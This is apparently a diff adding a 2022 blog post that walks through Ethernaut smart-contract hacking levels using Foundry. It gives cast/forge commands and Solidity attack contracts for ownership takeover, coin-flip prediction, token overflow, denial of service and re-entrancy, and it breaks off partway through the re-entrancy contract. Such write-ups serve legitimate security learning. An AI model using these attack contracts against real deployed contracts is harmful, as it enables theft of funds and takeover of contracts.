@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  
+  
+  <title>Completing Ethernaut Series: Part I</title>
+  <meta name="description" content="Ethernaut is a Solidity game where each level needs to be “hacked” by finding some vulnerability in an Ethereum smart contract. I found this to be an engaging way to learn the basics behind Ethereum smart contracts. Currently, there are 27 levels of varying difficulty. Below are brief notes on how I completed each level. While there are already many solution write-ups out there, most use Hardhat while this writeup uses Foundry (see previous blog) to test and interact with the game.">
+  
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="https://axucar.ca/2022/09/13/ethernaut-series/">
+  
+  
+  <link rel="alternate" type="application/rss+xml" title="Carlos Xu" href="https://axucar.ca/feed.xml">
+
+  
+
+  
+  <meta property="og:title" content="Completing Ethernaut Series: Part I">
+  <meta property="og:site_name" content="Carlos Xu">
+  <meta property="og:url" content="https://axucar.ca/2022/09/13/ethernaut-series/">
+  <meta property="og:description" content="Ethernaut is a Solidity game where each level needs to be “hacked” by finding some vulnerability in an Ethereum smart contract. I found this to be an engaging way to learn the basics behind Ethereum smart contracts. Currently, there are 27 levels of varying difficulty. Below are brief notes on how I completed each level. While there are already many solution write-ups out there, most use Hardhat while this writeup uses Foundry (see previous blog) to test and interact with the game.">
+  
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="jekyllrb">
+  <meta name="twitter:title" content="Completing Ethernaut Series: Part I">
+  <meta name="twitter:description" content="Ethernaut is a Solidity game where each level needs to be “hacked” by finding some vulnerability in an Ethereum smart contract. I found this to be an engaging way to learn the basics behind Ethereu...">
+  
+    <meta name="twitter:creator" content="jekyllrb">
+  
+  
+
+  <link rel="dns-prefetch" href="https://fonts.gstatic.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bitter:ital,wght@0,400;0,700;1,400&amp;display=swap" rel="stylesheet">
+
+  
+
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Carlos Xu</a>
+
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/archives/">Archives</a>
+      
+        
+        <a class="page-link" href="https://github.com/axucar">GitHub</a>
+      
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    
+      <h1 class="post-title" itemprop="name headline">Completing Ethernaut Series: Part I</h1>
+    
+    <p class="post-meta"><time datetime="2022-09-13T00:00:00+00:00" itemprop="datePublished">Sep 13, 2022</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <ul id="markdown-toc">
+  <li><a href="#fallback" id="markdown-toc-fallback">Fallback</a></li>
+  <li><a href="#fallout" id="markdown-toc-fallout">Fallout</a></li>
+  <li><a href="#coin-flip" id="markdown-toc-coin-flip">Coin Flip</a></li>
+  <li><a href="#telephone" id="markdown-toc-telephone">Telephone</a></li>
+  <li><a href="#token" id="markdown-toc-token">Token</a></li>
+  <li><a href="#delegation" id="markdown-toc-delegation">Delegation</a></li>
+  <li><a href="#force" id="markdown-toc-force">Force</a></li>
+  <li><a href="#vault" id="markdown-toc-vault">Vault</a></li>
+  <li><a href="#king" id="markdown-toc-king">King</a></li>
+  <li><a href="#re-entrancy" id="markdown-toc-re-entrancy">Re-entrancy</a></li>
+  <li><a href="#elevator" id="markdown-toc-elevator">Elevator</a></li>
+  <li><a href="#privacy" id="markdown-toc-privacy">Privacy</a></li>
+  <li><a href="#gatekeeper-one" id="markdown-toc-gatekeeper-one">Gatekeeper One</a></li>
+  <li><a href="#gatekeeper-two" id="markdown-toc-gatekeeper-two">Gatekeeper Two</a></li>
+</ul>
+<p><a href="https://ethernaut.openzeppelin.com/">Ethernaut </a> is a Solidity game where each level needs to be “hacked” by finding some vulnerability in an Ethereum smart contract. I found this to be an engaging way to learn the basics behind Ethereum smart contracts. Currently, there are 27 levels of varying difficulty. Below are brief notes on how I completed each level. While there are already many solution write-ups out there, most use Hardhat while this writeup uses Foundry (see <a href="http://axucar.ca/2022/09/09/foundryexplain/">previous blog</a>) to test and interact with the game.</p>
+
+<hr />
+<h1 id="fallback">Fallback</h1>
+
+<p>The fallback function allows contracts to receive Ether. To trigger fallback function in a contract:</p>
+
+<ol>
+  <li>call function that doesn’t exist within the contract (or omitting required data)</li>
+  <li>send ether without any data to the contract</li>
+</ol>
+
+<p>Note that the <code class="language-plaintext highlighter-rouge">receive()</code> function, if it exists in the contract, gets called instead of <code class="language-plaintext highlighter-rouge">fallback()</code> if <code class="language-plaintext highlighter-rouge">msg.data</code> is empty but <code class="language-plaintext highlighter-rouge">msg.value</code> is positive, as will be the case in this level.</p>
+
+<p>We see there are two options to gaining ownership of the contract (ie. to set <code class="language-plaintext highlighter-rouge">owner=msg.sender</code>). Either we contribute more than 1000 ether (which would take weeks of requesting on testnet faucet), or we pass the requirement in the <code class="language-plaintext highlighter-rouge">receive()</code> function: <code class="language-plaintext highlighter-rouge">require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0)</code> . Thus, the steps are:</p>
+
+<ul>
+  <li>Call <code class="language-plaintext highlighter-rouge">contribute</code> with some arbitrary positive <code class="language-plaintext highlighter-rouge">msg.value</code>
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">cast send &lt;challenge_addr&gt; "contribute()" --value 777</code></li>
+      <li>Note that the <code class="language-plaintext highlighter-rouge">msg.value</code> is in <code class="language-plaintext highlighter-rouge">wei = 1e-18 ether</code></li>
+    </ul>
+  </li>
+  <li>Send some ether without any data, ie. empty <code class="language-plaintext highlighter-rouge">msg.data</code>, to trigger the <code class="language-plaintext highlighter-rouge">receive()</code> function
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">cast send &lt;challenge_addr&gt; --value 555</code></li>
+      <li>Now, the owner should be us: <code class="language-plaintext highlighter-rouge">cast call &lt;challenge_adddr&gt; "owner()(address)"</code></li>
+    </ul>
+  </li>
+  <li>Withdraw entire contract balance of ether <code class="language-plaintext highlighter-rouge">cast send &lt;challenge_addr&gt; "withdraw()"</code></li>
+</ul>
+
+<p>As a side detail, I did not use a keystore since I wanted to use an existing account on Metamask so I set up the <code class="language-plaintext highlighter-rouge">$PRIVATE_KEY</code> environment variable in an <code class="language-plaintext highlighter-rouge">.env</code> file and append  <code class="language-plaintext highlighter-rouge">--private-key $PRIVATE_KEY</code> to the <code class="language-plaintext highlighter-rouge">cast send</code> commands that publish a transaction.</p>
+
+<p>Lesson here is one should be careful when changing contract ownership within a fallback function, or transferring out funds inside fallback function because anyone can trigger fallback function.</p>
+
+<hr />
+<h1 id="fallout">Fallout</h1>
+
+<p>The <code class="language-plaintext highlighter-rouge">Fal1out</code> function (which was meant as a constructor) is mispelled and doesn’t match the contract name <code class="language-plaintext highlighter-rouge">Fallout</code>! Therefore, we can still call the constructor function which sets <code class="language-plaintext highlighter-rouge">owner = msg.sender</code>.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">cast send &lt;challenge_addr&gt; "Fal1out()" --value 777</code></li>
+</ul>
+
+<p>This happened in the Rubixi hack incidence, the developers changed the contract’s name from <code class="language-plaintext highlighter-rouge">Dynamic Pyramid</code> to <code class="language-plaintext highlighter-rouge">Rubixi</code>. However, they forgot to rename the constructor function to <code class="language-plaintext highlighter-rouge">Rubixi()</code>, allowing anyone to become the owner and withdraw funds. This is less relevant now that the standard is to use the reserved <code class="language-plaintext highlighter-rouge">constructor</code> <a href="https://solidity-by-example.org/constructor/">keyword</a>.</p>
+
+<hr />
+<h1 id="coin-flip">Coin Flip</h1>
+
+<p>The key is that <code class="language-plaintext highlighter-rouge">block.number</code> can be known since an attack can execute <code class="language-plaintext highlighter-rouge">flip()</code> within same block.</p>
+<ul>
+  <li>Note that <code class="language-plaintext highlighter-rouge">using SafeMath for uint256</code> is not required after solidity 0.8.x.</li>
+  <li>Deploy contract below <code class="language-plaintext highlighter-rouge">forge create src/AttackCoinflip.sol:AttackCoinflip --verify</code>
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">--verify</code> uploads the verified source code to Etherscan</li>
+    </ul>
+  </li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pragma</span> <span class="n">solidity</span> <span class="mf">0.8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+
+<span class="k">interface</span> <span class="n">ICoinFlip</span><span class="p">{</span>
+    <span class="k">function</span> <span class="n">flip</span><span class="p">(</span><span class="kt">bool</span> <span class="n">_guess</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">contract</span> <span class="n">AttackCoinflip</span><span class="p">{</span>  
+    <span class="kt">uint256</span> <span class="n">FACTOR</span> <span class="o">=</span> <span class="mi">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>		
+    <span class="kt">address</span> <span class="n">coinflipAddress</span> <span class="o">=</span> <span class="mh">0x07d53476B965f9A594152D85B0e1cfbAc370503f</span><span class="p">;</span>
+    <span class="n">ICoinFlip</span> <span class="k">public</span> <span class="n">coinflipContract</span> <span class="o">=</span> <span class="n">ICoinFlip</span><span class="p">(</span><span class="n">coinflipAddress</span><span class="p">);</span>
+    <span class="k">function</span> <span class="n">flip</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+        <span class="kt">uint256</span> <span class="n">blockValue</span> <span class="o">=</span> <span class="kt">uint256</span><span class="p">(</span><span class="nb">blockhash</span><span class="p">(</span><span class="n">block</span><span class="p">.</span><span class="n">number</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span>
+        <span class="kt">uint256</span> <span class="n">coinFlip</span> <span class="o">=</span> <span class="n">blockValue</span> <span class="o">/</span> <span class="n">FACTOR</span><span class="p">;</span>
+        <span class="kt">bool</span> <span class="n">side</span> <span class="o">=</span> <span class="n">coinFlip</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">?</span> <span class="nb">true</span> <span class="o">:</span> <span class="nb">false</span><span class="p">;</span>
+        <span class="n">coinflipContract</span><span class="p">.</span><span class="n">flip</span><span class="p">(</span><span class="n">side</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Call <code class="language-plaintext highlighter-rouge">flip()</code> 10x via <code class="language-plaintext highlighter-rouge">cast send &lt;challenge_addr&gt; "flip()" --gas-limit 300000</code></li>
+</ul>
+
+<hr />
+<h1 id="telephone">Telephone</h1>
+
+<ul>
+  <li>Call <code class="language-plaintext highlighter-rouge">changeOwner</code> from a smart contract instead of my wallet
+    <ul>
+      <li>So <code class="language-plaintext highlighter-rouge">tx.origin ≠ msg.sender</code> since <code class="language-plaintext highlighter-rouge">msg.sender</code> would be contract address, but <code class="language-plaintext highlighter-rouge">tx.origin</code> is the signer of the originating transaction (ie. externally-owned account (EOA) derived from a private key)</li>
+      <li>Only wallets (EOAs) can be <code class="language-plaintext highlighter-rouge">tx.origin</code>, not contracts, whereas either one can be <code class="language-plaintext highlighter-rouge">msg.sender</code></li>
+    </ul>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">forge create --private-key $PRIVATE_KEY src/AttackTelephone.sol:AttackTelephone</code></li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pragma</span> <span class="n">solidity</span> <span class="mf">0.8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+
+<span class="k">interface</span> <span class="n">ITelephone</span><span class="p">{</span>
+    <span class="k">function</span> <span class="n">changeOwner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">contract</span> <span class="n">AttackTelephone</span><span class="p">{</span>  
+    <span class="kt">address</span> <span class="n">telephoneAddress</span> <span class="o">=</span> <span class="mh">0x16a5385C66f06D6190eAbD5979816317f314Fe4C</span><span class="p">;</span>
+    <span class="n">ITelephone</span> <span class="k">public</span> <span class="n">telephoneContract</span> <span class="o">=</span> <span class="n">ITelephone</span><span class="p">(</span><span class="n">telephoneAddress</span><span class="p">);</span>
+    <span class="k">function</span> <span class="n">attack</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+        <span class="n">telephoneContract</span><span class="p">.</span><span class="n">changeOwner</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">cast send --private-key $PRIVATE_KEY &lt;challenge_addr&gt; "attack()"</code></p>
+
+<ul>
+  <li>Avoid phishing attacks by avoiding authenticating using <code class="language-plaintext highlighter-rouge">tx.origin</code>. Instead, always use <code class="language-plaintext highlighter-rouge">msg.sender</code> to authenticate (see <a href="https://solidity-by-example.org/hacks/phishing-with-tx-origin/">here</a>)
+    <ul>
+      <li>For instance, a vulnerability occurs when an attacker convinces victim to send him/her some small amount of ether <code class="language-plaintext highlighter-rouge">_amount</code>, triggering a malicious fallback function that transfers the funds of victim <code class="language-plaintext highlighter-rouge">tx.origin</code> to attacker.</li>
+      <li>We should replace <code class="language-plaintext highlighter-rouge">tx.origin</code> (victim) with <code class="language-plaintext highlighter-rouge">msg.sender</code> (attacker contract) in the require statement</li>
+    </ul>
+  </li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//A Wallet contract (bad) transfer method
+</span><span class="k">function</span> <span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="k">payable</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="nb">require</span><span class="p">(</span><span class="n">tx</span><span class="p">.</span><span class="n">origin</span> <span class="o">==</span> <span class="n">owner</span><span class="p">);</span>
+
+    <span class="p">(</span><span class="kt">bool</span> <span class="n">sent</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">_to</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="n">_amount</span><span class="p">}(</span><span class="s">""</span><span class="p">);</span>
+    <span class="nb">require</span><span class="p">(</span><span class="n">sent</span><span class="p">,</span> <span class="s">"Failed to send Ether"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//attacker contract's fallback function
+</span><span class="k">function</span> <span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
+    <span class="n">wallet</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">attackerAddress</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">wallet</span><span class="p">).</span><span class="nb">balance</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<hr />
+
+<h1 id="token">Token</h1>
+
+<p>We exploit integer underflow/overflow with uint! Because we are dealing with unsigned ints: the require statement <code class="language-plaintext highlighter-rouge">require(balances[msg.sender] - _value &gt;= 0)</code> is always true.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="n">balances</span><span class="p">;</span>
+<span class="p">...</span>
+<span class="k">function</span> <span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_value</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">require</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">-</span> <span class="n">_value</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_value</span><span class="p">;</span>
+    <span class="n">balances</span><span class="p">[</span><span class="n">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="n">_value</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>We need a <code class="language-plaintext highlighter-rouge">msg.sender</code> that is not us (the <code class="language-plaintext highlighter-rouge">player</code> address) to subtract <code class="language-plaintext highlighter-rouge">value</code> amount.</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">forge create src/AttackToken.sol:AttackToken</code></li>
+  <li><code class="language-plaintext highlighter-rouge">cast send &lt;challenge_addr&gt; "attack()" --gas-limit 300000</code>
+    <ul>
+      <li>ie. <code class="language-plaintext highlighter-rouge">msg.sender</code> in the <code class="language-plaintext highlighter-rouge">transfer</code> function will be the attack contract we deployed</li>
+    </ul>
+  </li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pragma</span> <span class="n">solidity</span> <span class="mf">0.8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+
+<span class="k">interface</span> <span class="n">IToken</span><span class="p">{</span>
+    <span class="k">function</span> <span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_value</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">contract</span> <span class="n">AttackToken</span><span class="p">{</span>  	
+    <span class="kt">address</span> <span class="n">tokenAddress</span> <span class="o">=</span> <span class="mh">0x007E0ef5B081961Dc6D5b92fF375Dd077A7C1F33</span><span class="p">;</span>
+    <span class="n">IToken</span> <span class="k">public</span> <span class="n">tokenContract</span> <span class="o">=</span> <span class="n">IToken</span><span class="p">(</span><span class="n">tokenAddress</span><span class="p">);</span>
+    <span class="kt">address</span> <span class="n">sendTo</span> <span class="o">=</span> <span class="mh">0x9bdcf9696e273aFd83992b1Fb5672A70532ca9E1</span><span class="p">;</span> <span class="c1">//player address
+</span>
+    <span class="k">function</span> <span class="n">attack</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>		
+        <span class="n">tokenContract</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">sendTo</span><span class="p">,</span><span class="mi">2</span><span class="o">**</span><span class="mi">256</span> <span class="o">-</span> <span class="mi">21</span><span class="p">);</span> <span class="c1">//sentTo has 20 already
+</span>    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Note that the <code class="language-plaintext highlighter-rouge">player</code> starts with 20 tokens, hence sending <code class="language-plaintext highlighter-rouge">2**256 - 21</code> to it. This results in <code class="language-plaintext highlighter-rouge">player</code> address having the maximum <code class="language-plaintext highlighter-rouge">uint256 </code>balance of <code class="language-plaintext highlighter-rouge">2**256 - 1</code> tokens. Alternatively, we could’ve sent 21 tokens from <code class="language-plaintext highlighter-rouge">player</code> to anyone else, causing integer underlow.</p>
+
+<hr />
+
+<h1 id="delegation">Delegation</h1>
+
+<p>Recall that <code class="language-plaintext highlighter-rouge">call</code> in Solidity is a low level <a href="https://solidity-by-example.org/call/">function</a> to interact with other contracts</p>
+<ul>
+  <li>Takes encoded function signature and args as the parameter (the encoded payload <code class="language-plaintext highlighter-rouge">abi.encodeWithSignature(func_sig, args)</code> becomes <code class="language-plaintext highlighter-rouge">msg.data</code> in the contract being called) \</li>
+  <li>For instance, <code class="language-plaintext highlighter-rouge">(bool success, bytes memory data) = _addr.call{value: msg.value, gas: 5000}(abi.encodeWithSignature("foo(string,uint256)", "asdf", 123));</code> effectively calls <code class="language-plaintext highlighter-rouge">foo(string,uint256)</code> in the <code class="language-plaintext highlighter-rouge">_addr</code> contract
+    <ul>
+      <li>As usual, if <code class="language-plaintext highlighter-rouge">foo(string,uint256)</code> doesn’t exist, it will trigger the fallback function in <code class="language-plaintext highlighter-rouge">_addr</code> contract</li>
+    </ul>
+  </li>
+  <li>Similarly, <code class="language-plaintext highlighter-rouge">delegatecall</code> executes code of another contract, but when contract <code class="language-plaintext highlighter-rouge">A</code> executes <code class="language-plaintext highlighter-rouge">delegatecall</code> to contract <code class="language-plaintext highlighter-rouge">B</code>, <code class="language-plaintext highlighter-rouge">B</code>’s code is executed
+<strong>with contract <code class="language-plaintext highlighter-rouge">A</code>’s storage, <code class="language-plaintext highlighter-rouge">msg.sender</code> and <code class="language-plaintext highlighter-rouge">msg.value</code></strong>. See here for <a href="https://solidity-by-example.org/delegatecall/">delegatecall example</a>.</li>
+</ul>
+
+<p>ABI-encoding compresses function and arguments into type <code class="language-plaintext highlighter-rouge">bytes</code> which is displayed in hex.</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">cast calldata "pwn()”</code> = 0xdd365b8b, known as the method id (8 hex characters = 4 bytes). The reverse operation is called <code class="language-plaintext highlighter-rouge">cast 4byte 0xdd365b8b</code>  which returns function signature for the given selector <code class="language-plaintext highlighter-rouge">pwn()</code>
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">cast calldata “baz(uint32,bool)” 69 true</code>
+        <ul>
+          <li><code class="language-plaintext highlighter-rouge">0xcdcd77c0</code>, again 8 hex = 4 bytes</li>
+          <li>69 is <code class="language-plaintext highlighter-rouge">0x0000000000000000000000000000000000000000000000000000000000000045</code>, 64 hex characters = 32 bytes</li>
+          <li><code class="language-plaintext highlighter-rouge">true</code> is <code class="language-plaintext highlighter-rouge">0x0000000000000000000000000000000000000000000000000000000000000001</code>, also 64 hex</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p>To solve this level:</p>
+<ul>
+  <li>Get ABI-encoding of “pwn()”: <code class="language-plaintext highlighter-rouge">cast calldata "pwn()”</code> = 0xdd365b8b</li>
+  <li><code class="language-plaintext highlighter-rouge">cast send &lt;challenge_addr&gt; 0xdd365b8b --gas-limit 300000</code>
+    <ul>
+      <li>calls <code class="language-plaintext highlighter-rouge">pwn()</code> on <code class="language-plaintext highlighter-rouge">Delegation</code> contract which does not exist, so fallback function of <code class="language-plaintext highlighter-rouge">Delegation</code> gets called.</li>
+      <li>Then, <code class="language-plaintext highlighter-rouge">delegatecall</code> is executed on <code class="language-plaintext highlighter-rouge">Delegate</code> contract with<code class="language-plaintext highlighter-rouge">pwn()</code> function (encoded in bytes) as the <code class="language-plaintext highlighter-rouge">msg.data=0xdd365b8b</code>. Thus, we execute the <code class="language-plaintext highlighter-rouge">pwn()</code> function but on the <code class="language-plaintext highlighter-rouge">Delegation</code>’s storage which sets its <code class="language-plaintext highlighter-rouge">owner</code> variable to our <code class="language-plaintext highlighter-rouge">player</code> address.</li>
+    </ul>
+  </li>
+</ul>
+
+<hr />
+
+<h1 id="force">Force</h1>
+
+<p>This level simply illustrates that you can force sending ether to a contract that does not have any payable functions, by using <code class="language-plaintext highlighter-rouge">selfdestruct</code> of another contract.</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">forge create src/Force.sol:ForceSend --value 1 --constructor-args &lt;challenge_addr&gt;</code>
+    <ul>
+      <li>note we pre-funded the contract with 1 wei, which was sent to target contract, before self-destructing in the same tx</li>
+    </ul>
+  </li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">ForceSend</span> <span class="p">{</span>
+    <span class="k">constructor</span> <span class="p">(</span><span class="kt">address</span> <span class="k">payable</span> <span class="n">_target</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">);</span>
+        <span class="nb">selfdestruct</span><span class="p">(</span><span class="n">_target</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<hr />
+<h1 id="vault">Vault</h1>
+
+<p>We need to get raw value of contract’s second storage slot, since the storage slots are laid out in the order that the variables are defined.</p>
+<ul>
+  <li>Hence, <code class="language-plaintext highlighter-rouge">locked</code> corresponds to the first slot, and <code class="language-plaintext highlighter-rouge">bytes32</code> corresponds to the second.
+    <ul>
+      <li>Details on the subtleties of the storage layout (such as packing multiple variables of size &lt; 32 bytes into one slot) can be found <a href="https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html">here</a>.</li>
+    </ul>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">cast storage &lt;challenge_addr&gt; 1</code>
+    <ul>
+      <li>equivalent to <code class="language-plaintext highlighter-rouge">ethers.provider.getStorageAt(addr,1)</code> in Javascript’s <code class="language-plaintext highlighter-rouge">ethers</code> library.</li>
+    </ul>
+  </li>
+</ul>
+
+<hr />
+
+<h1 id="king">King</h1>
+
+<p>To break this Ponzi game, we make our attack contract unable to receive tokens.</p>
+<ul>
+  <li>use <code class="language-plaintext highlighter-rouge">revert()</code> in the <code class="language-plaintext highlighter-rouge">receive()</code> payable function, which means no one can reclaim the kingship from us</li>
+  <li><code class="language-plaintext highlighter-rouge">forge create src/AttackKing.sol:AttackKing --value 0.001ether --constructor-args &lt;challenge_addr&gt;</code></li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="k">contract</span> <span class="n">AttackKing</span><span class="p">{</span>
+	<span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span> <span class="o">&gt;=</span> <span class="mf">0.001</span> <span class="kc">ether</span><span class="p">,</span> <span class="s">"please send &gt;= 0.001 ether"</span><span class="p">);</span>
+	<span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="k">payable</span> <span class="n">_sendTo</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
+		<span class="n">_sendTo</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="n">value</span><span class="o">:</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">}(</span><span class="s">""</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+		<span class="nb">revert</span><span class="p">();</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<hr />
+
+<h1 id="re-entrancy">Re-entrancy</h1>
+
+<p>This is the same exploit that led to the famous <a href="https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/">DAO hack</a>. Due to sending funds before updating internal state, the malicious contract is able to keep calling the <code class="language-plaintext highlighter-rouge">withdraw</code> function via a malicious fallback/receive function. To fix the vulnerability, we could update the internal <code class="language-plaintext highlighter-rouge">balances</code> state before calling the ether transfer, ensuring safe re-entry into the <code class="language-plaintext highlighter-rouge">withdraw</code> function.</p>
+
+<p>When <code class="language-plaintext highlighter-rouge">msg.sender.call{value:_amount}("")</code> is processed, the control is handed back to the <code class="language-plaintext highlighter-rouge">receive</code> function in our originating attacking contract, which keeps calling <code class="language-plaintext highlighter-rouge">withdraw</code> function until we empty the victim contract.</p>
+<ul>
+  <li>Remember to make fallback function payable (or alternatively, use a payable <code class="language-plaintext highlighter-rouge">receive()</code> function)</li>
+  <li><code class="language-plaintext highlighter-rouge">forge create src/AttackReentrancy.sol:AttackReentrancy --verify</code></li>
+  <li><code class="language-plaintext highlighter-rouge">cast send &lt;challenge_addr&gt; "attack()" --gas-limit 300000 --value 0.001ether</code></li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+
+<span class="k">interface</span> <span class="n">IReentrance</span><span class="p">{</span>
+    <span class="k">function</span> <span class="n">withdraw</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+    <span class="k">function</span> <span class="n">donate</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">contract</span> <span class="n">AttackReentrancy</span><span class="p">{</span>    
+    <span class="kt">address</span> <span class="n">contractAddress</span> <span class="o">=</span> <span class="mh">0xABF83aD603829851f6cc631D4bcCD084b0EAedb9</span><span class="p">;</span>
+    <span class="n">IReentrance</span> <span class="k">public</span> <span class="n">challengeContract</span> <span class="o">=</span> <span class="n">IReentrance</span><span class="p">(</span><span class="n">contractAddress</span><span class="p">);</span>
+    <span class="kt">uint</span> <span class="n">amount</span><span class="p">;</span> 
+
